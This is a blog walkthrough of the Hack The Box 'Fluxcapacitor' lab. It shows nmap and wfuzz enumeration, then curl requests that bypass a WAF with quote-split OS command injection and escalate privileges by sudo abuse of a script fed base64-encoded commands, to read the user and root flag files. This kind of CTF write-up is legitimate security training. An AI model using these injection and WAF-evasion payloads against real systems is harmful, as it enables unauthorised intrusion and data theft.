@@ -1,0 +1,325 @@
+
+								
+																		Hack the Box Challenge: Fluxcapacitor Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on May 18, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are sharing our experience that can be helpful in solving new CTF challenge: Fluxcapacitor of Hack The Box. Solving this lab is not much easy, all you need is your web penetration testing skills to solve this challenge. This lab is designed to bypass the Web Application Firewall (WAF) for exploiting OS command injection vulnerability in this machine.
+Level: Medium
+Task: Find the user.txt and root.txt in the vulnerable Lab.
+Penetration Methodology
+
+Network Scanning
+Enumeration
+Exploiting  
+Privilege Escalation
+Capture root.txt file
+
+Let’s Begin!!
+Network Scanning
+These labs are only available online, therefore, they have a static IP. Fluxcapacitor has IP: 10.10.10.69.
+As we knew, the initial stage is enumeration; therefore, use the nmap version scan to collect information about the target machine and running services.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.69
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.69
+					
+				
+			
+		
+
+
+From its scanning result, it tells us that port 80 is open to web services and is also protected by the “superWAF” web application firewall, so we explored the target IP in the web browser but found nothing interesting.
+
+Enumeration
+Then we looked into its source code and saw an exciting comment pointing to URL: /sync, and without wasting time, we opened /sync in URL.
+
+LOL!!! It gave 403 forbidden error message and something openresty/1.13.6.1 then we looked at Google for any exploit related to it, but could not find any working exploit against it.
+
+At the moment, we decided to use burp suite to intercept our browser request. After intercepting the HTTP request, the raw information is sent to the repeater.
+
+Yeah!! It was the same output as in the web browser. There might be some chances of WAF filter restriction on user agents such as Mozilla Firefox/5.0.
+
+So we start scrutiny for the User- Agent field by randomly replacing the original user- agent content from “raj.” Finally!!! It gave the current timestamp as disclosed in the comment found in the home page source code.
+
+Now it was confirmed that there was a SuperWAF filter against the user agent field, so we tried to search for its exploit in Google, but we didn’t find any particular exploit.  Nevertheless, Google gave a little hint for OS command injection and on the basis of that, we try a few parameters in the HTTP- header, such as /sync?test= ls, which answer each time with the same timestamp. Therefore, we need to fuzz the proper directory, so we will use wfuzz in our next step.
+
+Exploiting
+So we use common.txt wordlist for URL brute force and will execute below command.
+
+		
+		
+			
+			
+			
+			
+wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
+			
+				
+					
+				
+					1
+				
+						wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
+					
+				
+			
+		
+
+It gave 403 response for payload “opt”; let’s try to opt after/sync and identify the response.
+
+Now use the’ opt’ parameter to bypass WAF and execute ls command through it, HOWEVER again, there is a trick to execute ls command. Because WAF won’t allow you to execute OS command injection directly, it will be a little harder to exploit it. But THANKS to medium.com, because I have the idea of bypassing WAF to exploit OS command injection known as string literal concatenation from this website, it means that adjacent string literals are concatenated, without any operator.
+
+We took help from the website I mentioned above and executed three commands: whoami, id, uname through curl as shown in the image.
+
+		
+		
+			
+			
+			
+			
+curl "http://10.10.10.69/sync?opt=' whoami'"
+curl "http://10.10.10.69/sync?opt=' id'"
+curl "http://10.10.10.69/sync?opt=' u'n'ame -a'"
+			
+				
+					
+				
+					123
+				
+						curl "http://10.10.10.69/sync?opt=' whoami'"curl "http://10.10.10.69/sync?opt=' id'"curl "http://10.10.10.69/sync?opt=' u'n'ame -a'"
+					
+				
+			
+		
+
+Superb!! It was great to know that we have successfully bypassed WAF, but the task is still not finished.
+
+Let’s seize the user.txt and root.txt file and finish this task. Hhhhhh!!!! Believe me, it’s still not easy to bypass WAF even if your goal is near. 
+Seriously, we put a lot of effort and finally found user.txt when we executed the commands below:
+
+		
+		
+			
+			
+			
+			
+curl "http://10.10.10.69/sync?opt=' l's' /home'"
+curl "http://10.10.10.69/sync?opt=' l's' /home/Fl'uxC'apa'cit'orI'n'c'"
+curl "http://10.10.10.69/sync?opt=' c'at' /home/Fl'uxC'apa'cit'orI'n'c/u'ser'.'txt''"
+			
+				
+					
+				
+					123
+				
+						curl "http://10.10.10.69/sync?opt=' l's' /home'"curl "http://10.10.10.69/sync?opt=' l's' /home/Fl'uxC'apa'cit'orI'n'c'"curl "http://10.10.10.69/sync?opt=' c'at' /home/Fl'uxC'apa'cit'orI'n'c/u'ser'.'txt''"
+					
+				
+			
+		
+
+
+Privilege Escalation
+Now the goal was root.txt and taking a lesson from the previous experience, I chose to run the sudo -l command to check the sudo privileges of the current user.
+
+		
+		
+			
+			
+			
+			
+curl "http://10.10.10.69/sync?opt=' sudo -l'"
+			
+				
+					
+				
+					1
+				
+						curl "http://10.10.10.69/sync?opt=' sudo -l'"
+					
+				
+			
+		
+
+
+Awesome!! It told us that we can run a “monit” script with root privileges without using a password inside the /home/themiddle/directory. 
+Let’s open it with the help of the cat command as done here:
+
+		
+		
+			
+			
+			
+			
+curl "http://10.10.10.69/sync?opt=' c'at' /h'ome/themiddle/.monit''"
+			
+				
+					
+				
+					1
+				
+						curl "http://10.10.10.69/sync?opt=' c'at' /h'ome/themiddle/.monit''"
+					
+				
+			
+		
+
+After reading the .monit file, we concluded that the script takes two parameters i.e. cmd string and base64 decoding which will match the conditions according to it and passes the final result to bash -c as the parameter.
+ 
+It was therefore clear that the first parameter will match the string “cmd” and the second will decode the base64 value, which is why we first generated the base64 value for /root/root.txt because we were well aware of the location of the root.txt file from our previous challenges.
+
+		
+		
+			
+			
+			
+			
+echo "cat /root/root.txt" | base64
+			
+				
+					
+				
+					1
+				
+						echo "cat /root/root.txt" | base64
+					
+				
+			
+		
+
+Now with the help of sudo privilege, execute the command to gain root access and complete the task by grabbing root.txt
+
+		
+		
+			
+			
+			
+			
+curl "http://10.10.10.69/sync?opt=' sudo /h'ome/themiddle/.monit' cmd Y2F0IC9yb290L3Jvb3QudHh0Cg=='"
+			
+				
+					
+				
+					1
+				
+						curl "http://10.10.10.69/sync?opt=' sudo /h'ome/themiddle/.monit' cmd Y2F0IC9yb290L3Jvb3QudHh0Cg=='"
+					
+				
+			
+		
+
+HURRAYYYY!!! We reached the goal and successfully found the root.txt file.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								KNX May 18, 2018 at 7:58 am							
+							
+							
+														
+							
+								Hi, the medium.com article that descrive how to bypass waf was made by themiddle, the same author of fluxcapacitor VM.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
